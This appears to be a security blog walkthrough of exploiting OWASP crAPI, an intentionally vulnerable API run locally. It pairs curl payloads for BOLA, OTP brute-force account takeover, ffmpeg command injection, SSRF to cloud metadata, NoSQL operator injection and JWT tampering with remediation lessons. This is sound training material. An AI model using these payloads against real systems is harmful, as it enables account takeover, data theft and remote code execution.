---
title: "OWASP crAPI — Complete Exploitation Walkthrough"
date: 2026-09-22 09:10:00 +0000
categories: [Damn Vulnerable Applications]
tags: [crAPI, OWASP, API Security, BOLA, SSRF, NoSQL Injection, JWT, Docker]
description: "Exploiting the OWASP Completely Ridiculous API (crAPI) mapped to the API Security Top 10: BOLA, broken auth/OTP brute force, excessive data exposure, BFLA, mass assignment, SSRF, NoSQLi and JWT attacks."
author: Paschal Sangawe
toc: true
---

**crAPI (Completely Ridiculous API)** is OWASP's intentionally-vulnerable API, built to demonstrate the **OWASP API Security Top 10**. It models a vehicle-services platform: users register, add vehicles, buy products, message mechanics, and upload videos. It is the natural API companion to DVWA (web) and DVGA (GraphQL).

This post maps each crAPI challenge to the API Security Top 10, with the endpoints and payloads I used.

> **Authorisation:** crAPI is deliberately vulnerable and meant to run locally. Everything below was tested on my own instance.

{% raw %}

## Setup

```bash
mkdir crapi && cd crapi
curl -o docker-compose.yml https://raw.githubusercontent.com/OWASP/crAPI/main/deploy/docker/docker-compose.yml
docker compose pull && docker compose up -d
```

- Web UI: `http://localhost:8888` · API: `http://localhost:8888/api`
- Mail catcher (MailHog): `http://localhost:8025`
- For the SSRF / unsafe-consumption challenges, add the documented hosts entries:

```text
127.0.0.1 crapi-web
127.0.0.1 crapi-api
```

Register two users (attacker + victim) and capture the `Authorization: Bearer <JWT>` token from login.

## API1 — Broken Object Level Authorization (BOLA)

**Access another user's vehicle location.** The vehicle ID is sequential/predictable and the endpoint never checks ownership:

```bash
curl -s http://localhost:8888/identity/api/v2/vehicle/<victimVehicleId>/location \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

**Access another user's mechanic report:**

```bash
curl -s "http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=<id>" \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

**Lesson:** authorize every object access against the authenticated user (`WHERE id=? AND owner_id=?`), and use unpredictable IDs. This is consistently the #1 API risk.

## API2 — Broken Authentication (OTP brute force → account takeover)

The password-reset flow uses a **4-digit OTP** with no rate limiting. Request a reset for the victim, then brute-force `0000–9999` against the check endpoint with a new password:

```bash
curl -s -X POST http://localhost:8888/identity/api/auth/v2/check-otp \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","otp":"1234","password":"NewPass@123"}'
```

A 10,000-key space is trivial to exhaust; the correct OTP resets the victim's password → **full account takeover**. The same flow exists under a different version path (`/v3/check-otp`), illustrating API9 (see below).

**Lesson:** rate-limit OTP verification, use longer/expiring OTPs, bind them to the session, and cap attempts.

## API3 — Excessive Data Exposure

`GET /community/api/v2/community/posts/recent` returns full nested objects — user email, vehicle details and more — far beyond what the UI needs:

```bash
curl -s http://localhost:8888/community/api/v2/community/posts/recent \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

The leaked **vehicle ID** here feeds the BOLA attack above — a classic chained finding.

**Lesson:** return only the fields the client needs (use DTOs/serializers), never the raw database object.

## API4 — Lack of Resources & Rate Limiting

Beyond the OTP brute force, there is no meaningful throttling on login, signup, or coupon application. Batch/rapid requests are accepted freely, enabling credential stuffing and resource abuse.

**Lesson:** rate-limit per identity and per IP, add lockouts and CAPTCHA, and monitor for enumeration patterns.

## API5 — Broken Function Level Authorization (BFLA)

A regular user can call administrative-style functions. For example, an "all orders" endpoint is reachable without an admin role:

```bash
curl -s http://localhost:8888/workshop/api/shop/orders/all \
  -H "Authorization: Bearer $ATTACKER_JWT"
```

Similarly, `DELETE /identity/api/v2/user/videos/{video_id}` can be called for **another user's** video (BOLA + BFLA).

**Lesson:** enforce role/function checks server-side on every endpoint; never rely on the UI hiding admin functions.

## API6 — Mass Assignment

The video-update endpoint binds submitted JSON onto the object without an allow-list. The `conversion_params` field is later passed to `ffmpeg`, so a mass-assigned value becomes **command injection → RCE**:

```bash
curl -s -X PUT http://localhost:8888/identity/api/v2/user/videos/<video_id> \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"conversion_params":"-vcodec h264 -vf \"scale=...; touch /tmp/pwned\""}'
```

Trigger the conversion and the injected command runs server-side.

**Lesson:** bind request data to explicit DTOs/allow-lists; never pass user-controlled parameters into shell/ffmpeg invocations.

## API7 — Server-Side Request Forgery (SSRF)

The "contact mechanic" feature takes a `mechanic_api` URL and fetches it server-side with no validation:

```bash
curl -s -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"mechanic_api":"http://169.254.169.254/latest/meta-data/","repeat_request":1,"mechanic_code":"TRAC","problem_details":"test","vin":"<vin>"}'
```

Point it at cloud metadata, internal services, or `crapi-api`/`crapi-web` to reach internal-only routes.

**Lesson:** allow-list destination hosts/schemes, resolve and block private/loopback/link-local ranges, and don't follow redirects blindly.

## API8 — Security Misconfiguration

Verbose errors, permissive CORS, and missing hardening across the stack. Always check `OPTIONS`, error bodies and response headers for leaked stack traces, allowed methods and reflected `Origin`.

## API9 — Improper Inventory Management

Older API versions remain live alongside current ones — e.g. `/identity/api/auth/v2/check-otp` vs `/v3/check-otp`, and `/workshop/api/v1/...` endpoints. Deprecated versions often lack the fixes applied to newer ones.

**Lesson:** maintain an accurate API inventory, retire old versions, and never assume "v2 is the only one".

## API10 — Unsafe Consumption of Third-Party APIs

crAPI trusts a **third-party mechanic API** and consumes its responses without validation. By controlling that upstream response (via SSRF or a malicious mechanic service), you can influence crAPI's behaviour and data.

**Lesson:** treat third-party API responses as untrusted — validate schemas, sanitise values, and apply timeouts/allow-lists.

## JWT and NoSQL injection extras

- **JWT:** crAPI's tokens can be abused via weak/forgeable claims — test `alg:none`, weak secrets (`hashcat -m 16500`) and claim tampering (`sub`/`role`).
- **NoSQL injection (coupon):** the coupon check passes JSON straight to MongoDB, so operators bypass validation:

```bash
curl -s -X POST http://localhost:8888/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer $ATTACKER_JWT" -H 'Content-Type: application/json' \
  -d '{"coupon_code":{"$ne":""}}'
```

## Challenge → OWASP mapping

| crAPI challenge | OWASP API Top 10 |
|-----------------|------------------|
| Vehicle/report IDOR | API1 BOLA |
| OTP brute-force password reset | API2 Broken Auth / API4 Rate Limiting |
| Community feed over-exposure | API3 Excessive Data Exposure |
| `orders/all`, delete others' videos | API5 BFLA |
| `conversion_params` → RCE | API6 Mass Assignment |
| Contact-mechanic URL fetch | API7 SSRF |
| Verbose errors / CORS | API8 Misconfiguration |
| v2/v3 endpoints both live | API9 Improper Inventory |
| Third-party mechanic API trust | API10 Unsafe Consumption |

## Remediation checklist

- Enforce **object-level authorization** on every endpoint; use unguessable IDs.
- Rate-limit and lock out OTP/login/reset flows; use long, expiring, session-bound OTPs.
- Return **minimal** fields; never serialize DB objects directly.
- Enforce **role/function** checks server-side on every route.
- Bind request bodies to **DTO allow-lists**; never feed user input to a shell.
- Validate SSRF destinations against host/scheme allow-lists and block internal ranges.
- Harden defaults, disable verbose errors, restrict CORS, and set security headers.
- Inventory and **retire** old API versions.
- Validate third-party API responses; use timeouts and least privilege.
- Verify JWT signatures with strong secrets; reject `alg:none`; parameterise database queries.

## Related posts

- [Damn Vulnerable Web Application (DVWA)](/posts/dvwa-walkthrough/)
- [Damn Vulnerable GraphQL Application (DVGA)](/posts/dvga-walkthrough/)
- [PortSwigger API Testing labs](/posts/portswigger-api-testing-labs/)
- [PortSwigger NoSQL Injection labs](/posts/portswigger-nosql-injection-labs/)

{% endraw %}
